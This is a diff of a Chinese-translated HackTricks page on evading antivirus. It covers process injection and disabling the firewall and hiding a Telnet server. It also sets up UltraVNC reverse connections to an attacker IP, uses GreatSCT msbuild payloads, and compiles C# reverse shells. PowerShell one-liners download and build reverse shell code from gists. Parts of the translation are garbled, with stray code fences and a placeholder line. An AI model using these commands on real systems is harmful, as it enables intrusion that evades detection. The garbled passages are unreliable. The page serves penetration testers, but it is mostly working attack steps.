+它涉及**生成一个新的牺牲进程**，将你的后渗透恶意代码注入到那个新进程中，执行你的恶意代码，完成后杀死新进程。这既有好处也有缺点。fork 和 run 方法的好处是执行发生在我们的 Beacon 植入过程**之外**。这意味着如果我们的后渗透行动出了问题或被发现，我们的**植入存活的机会**要**大得多**。缺点是被**行为检测**发现的机会**更大**。
 
 <figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
-* **内联**
+* **Inline**
 
-它是将后渗透恶意代码**注入到自己的进程中**。这样，你可以避免创建一个新的进程并让杀毒软件扫描它，但缺点是如果你的有效负载执行出现问题，你的Beacon**有更大的机会丢失**，因为它可能会崩溃。
+它是关于将后渗透恶意代码**注入到自己的进程中**。这样，你可以避免创建新进程并被 AV 扫描，但缺点是如果你的有效载荷执行出现问题，你**失去 beacon 的机会**要**大得多**，因为它可能会崩溃。
 
 <figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-如果你想了解更多关于C#程序集加载的内容，请查看这篇文章[https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)以及他们的InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）
+如果你想了解更多关于 C# 程序集加载的信息，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 和他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 {% endhint %}
 
-你也可以从PowerShell中加载C#程序集，参考[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)和[S3cur3th1sSh1t的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。
+你也可以**通过 PowerShell** 加载 C# 程序集，查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t 的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。
 
 ## 使用其他编程语言
 
-如[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)所提出的，可以通过让受损机器访问**攻击者控制的SMB共享上安装的解释器环境**来执行恶意代码。
+如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 所提议的，通过给受损机器访问**攻击者控制的 SMB 共享上安装的解释器环境**，可以使用其他语言执行恶意代码。
 
-通过允许访问SMB共享上的解释器二进制文件和环境，可以在受损机器的内存中**执行这些语言的任意代码**。
+通过允许访问 SMB 共享上的解释器二进制文件和环境，你可以**在受损机器的内存中执行这些语言的任意代码**。
 
-该存储库指出：防御者仍然会扫描脚本，但通过利用Go、Java、PHP等语言，我们可以**更灵活地绕过静态签名**。在这些语言中使用随机非混淆的反向shell脚本进行测试已经取得了成功。
+该仓库指出：Defender 仍然会扫描脚本，但通过使用 Go、Java、PHP 等，我们有**更多的灵活性来绕过静态签名**。使用这些语言中的随机未混淆的反向 shell 脚本进行测试已经证明是成功的。
 
-## 高级逃避
+## 高级规避
 
-逃避是一个非常复杂的主题，有时你必须考虑一个系统中许多不同的遥测来源，所以在成熟的环境中完全不被发现几乎是不可能的。
+规避是一个非常复杂的话题，有时你必须考虑到一个系统中的许多不同的遥测源，所以在成熟的环境中完全不被检测到几乎是不可能的。
 
-每个环境都有其优势和劣势。
+你对抗的每个环境都会有它们自己的优势和弱点。
 
-我强烈建议你观看[@ATTL4S](https://twitter.com/DaniLJ94)的这个演讲，以了解更多关于高级逃避技术的入门知识。
+我强烈建议你去看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这个演讲，以了解更多高级规避技术。
 
 {% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
 
-这也是[@mariuszbit](https://twitter.com/mariuszbit)关于深度逃避的另一个很棒的演讲。
+这还有另一个关于深度规避的精彩演讲，来自 [@mariuszbit](https://twitter.com/mariuszbit)。
 
 {% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}
 
 ## **旧技术**
 
-### **Telnet服务器**
+### **Telnet 服务器**
 
-直到Windows10，所有的Windows都带有一个**Telnet服务器**，你可以通过以下方式（作为管理员）安装：
+直到 Windows10，所有 Windows 都带有一个**Telnet 服务器**，你可以（作为管理员）安装：
 ```
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-让它在系统启动时**开始运行**，现在**运行**它：
+让它在系统**启动**时**开始**运行，并且现在**执行**它：
 ```
 sc config TlntSVR start= auto obj= localsystem
 ```
 **更改telnet端口**（隐蔽）并禁用防火墙：
-
-To change the telnet port, follow these steps:
-
-1. Open the command prompt as an administrator.
-2. Type `regedit` and press Enter to open the Registry Editor.
-3. Navigate to the following path: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Telnet\Parameters`.
-4. Right-click on the right pane and select New > DWORD (32-bit) Value.
-5. Name the new value `PortNumber`.
-6. Double-click on `PortNumber` and select Decimal.
-7. Enter the desired port number (e.g., 1234) and click OK.
-8. Close the Registry Editor.
-
-To disable the firewall, follow these steps:
-
-1. Open the Control Panel.
-2. Click on "System and Security" and then "Windows Defender Firewall".
-3. Click on "Turn Windows Defender Firewall on or off" in the left pane.
-4. Select "Turn off Windows Defender Firewall" for both private and public networks.
-5. Click OK to save the changes.
-
-Remember to enable the firewall and restore the telnet port to its original configuration after completing your tasks to maintain the security of your system.
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-从以下链接下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（下载二进制文件，而不是安装程序）
+从以下链接下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（你需要的是二进制下载文件，而不是安装程序）
 
 **在主机上**：执行 _**winvnc.exe**_ 并配置服务器：
 
-* 启用选项 _Disable TrayIcon_
+* 启用 _Disable TrayIcon_ 选项
 * 在 _VNC Password_ 中设置密码
 * 在 _View-Only Password_ 中设置密码
 
-然后，将二进制文件 _**winvnc.exe**_ 和新创建的文件 _**UltraVNC.ini**_ 移动到**受害者**内部
+然后，将二进制文件 _**winvnc.exe**_ 和**新创建的**文件 _**UltraVNC.ini**_ 移动到**受害者**计算机内
 
 #### **反向连接**
 
-**攻击者**应该在他的**主机**上执行二进制文件 `vncviewer.exe -listen 5900`，以便准备好接收反向**VNC连接**。然后，在**受害者**内部：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+**攻击者**应在其**主机**内执行二进制文件 `vncviewer.exe -listen 5900`，这样它将**准备好**捕获反向**VNC连接**。然后，在**受害者**计算机上：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
-**警告：**为保持隐蔽，您不能执行以下几个操作
+**警告：** 为了保持隐蔽，你必须避免做一些事情
 
-* 如果 winvnc 已经在运行，请不要启动它，否则会触发一个[弹出窗口](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查是否正在运行
-* 不要在没有 UltraVNC.ini 文件的同一目录下启动 winvnc，否则会导致[配置窗口](https://i.imgur.com/rfMQWcf.png)打开
-* 不要运行 `winvnc -h` 来获取帮助，否则会触发一个[弹出窗口](https://i.imgur.com/oc18wcu.png)
+* 如果 `winvnc` 已经在运行，不要启动它，否则你会触发一个[弹窗](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否在运行
+* 如果同一目录下没有 `UltraVNC.ini`，不要启动 `winvnc`，否则会导致[配置窗口](https://i.imgur.com/rfMQWcf.png)打开
+* 不要运行 `winvnc -h` 来获取帮助，否则你会触发一个[弹窗](https://i.imgur.com/oc18wcu.png)
 
 ### GreatSCT
 
@@ -402,55 +384,7 @@ cd GreatSCT/setup/
 cd ..
 ./GreatSCT.py
 ```
-在GreatSCT内部：
-
-## AV Bypass
-
-## AV绕过
-
-One of the biggest challenges faced by hackers is bypassing antivirus (AV) software. AV software is designed to detect and block malicious software, making it difficult for hackers to execute their attacks. However, there are several techniques that can be used to bypass AV software and successfully execute malicious code.
-
-黑客面临的最大挑战之一是绕过防病毒（AV）软件。AV软件旨在检测和阻止恶意软件，使黑客难以执行攻击。然而，有几种技术可以用来绕过AV软件并成功执行恶意代码。
-
-### Encoding and Encryption
-
-### 编码和加密
-
-One common technique used to bypass AV software is encoding or encrypting the malicious code. By encoding or encrypting the code, hackers can obfuscate the code and make it more difficult for AV software to detect. This can be done using various encoding or encryption algorithms, such as base64 encoding or AES encryption.
-
-绕过AV软件的一种常见技术是对恶意代码进行编码或加密。通过对代码进行编码或加密，黑客可以混淆代码，使AV软件更难以检测。可以使用各种编码或加密算法来实现，例如base64编码或AES加密。
-
-### Polymorphic Code
-
-### 多态代码
-
-Polymorphic code is another technique used to bypass AV software. Polymorphic code is code that can change its structure or behavior while maintaining its original functionality. By constantly changing the code's structure, hackers can create new variants of the code that are not recognized by AV software. This makes it difficult for AV software to detect and block the malicious code.
-
-多态代码是绕过AV软件的另一种技术。多态代码是可以在保持其原始功能的同时改变其结构或行为的代码。通过不断改变代码的结构，黑客可以创建AV软件无法识别的新变体代码。这使得AV软件难以检测和阻止恶意代码。
-
-### Fileless Attacks
-
-### 无文件攻击
-
-Fileless attacks are a type of attack that do not involve writing malicious code to the victim's disk. Instead, these attacks leverage existing legitimate processes or scripts to execute malicious actions directly in memory. Since there is no file for AV software to scan, fileless attacks can bypass traditional AV detection methods.
-
-无文件攻击是一种不涉及将恶意代码写入受害者磁盘的攻击类型。相反，这些攻击利用现有的合法进程或脚本直接在内存中执行恶意操作。由于没有文件供AV软件扫描，无文件攻击可以绕过传统的AV检测方法。
-
-### Code Injection
-
-### 代码注入
-
-Code injection is a technique where hackers inject malicious code into a legitimate process or application. By injecting the code into a trusted process, hackers can bypass AV software that only scans executable files. This technique can be used to execute malicious code without triggering AV alerts.
-
-代码注入是一种技术，黑客将恶意代码注入到合法的进程或应用程序中。通过将代码注入到可信进程中，黑客可以绕过只扫描可执行文件的AV软件。这种技术可以用来执行恶意代码而不触发AV警报。
-
-### Conclusion
-
-### 结论
-
-Bypassing AV software is a crucial skill for hackers. By using techniques such as encoding and encryption, polymorphic code, fileless attacks, and code injection, hackers can successfully bypass AV software and execute their attacks. However, it is important to note that these techniques may not always be effective, as AV software is constantly evolving to detect and block new threats.
-
-绕过AV软件是黑客的关键技能。通过使用编码和加密、多态代码、无文件攻击和代码注入等技术，黑客可以成功绕过AV软件并执行攻击。然而，需要注意的是，这些技术可能并不总是有效的，因为AV软件不断演变以检测和阻止新的威胁。
+Inside GreatSCT: (在GreatSCT内部:)
 ```
 use 1
 list #Listing available payloads
@@ -460,11 +394,11 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-现在使用 `msfconsole -r file.rc` 启动监听器，并执行以下 **xml payload**：
+现在使用 `msfconsole -r file.rc` **启动监听器** 并用以下命令**执行** **xml payload**：
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
-**当前的防御者会非常快速地终止进程。**
+**当前的防御者会非常快地终止进程。**
 
 ### 编译我们自己的反向Shell
 
@@ -472,11 +406,11 @@ https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
 #### 第一个C#反向Shell
 
-使用以下命令进行编译：
+使用以下命令编译：
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
-使用方法：
+使用它配合：
 ```
 back.exe <ATTACKER_IP> <PORT>
 ```
@@ -552,9 +486,9 @@ catch (Exception err) { }
 }
 }
 ```
-[https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)
-
-### 使用C#编译器
+```
+无可翻译内容。
+```
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
@@ -566,28 +500,18 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 32bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
 ```
+```markdown
 {% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}
 
-C#混淆器列表：[https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
+C# 混淆器列表：[https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
 ### C++
+```
 ```
 sudo apt-get install mingw-w64
 
 i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 ```
-[https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
-
-Merlin, Empire, Puppy, SalsaTools [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
-
-[https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
-
-[https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
-
-{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}
-
-{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}
-
 ### 其他工具
 ```bash
 # Veil Framework:
@@ -619,12 +543,12 @@ https://github.com/praetorian-code/vulcan
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
+* 你在**网络安全公司**工作吗？你想在**HackTricks**看到你的**公司广告**吗？或者你想要访问**PEASS的最新版本或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏
+* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**推特**上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
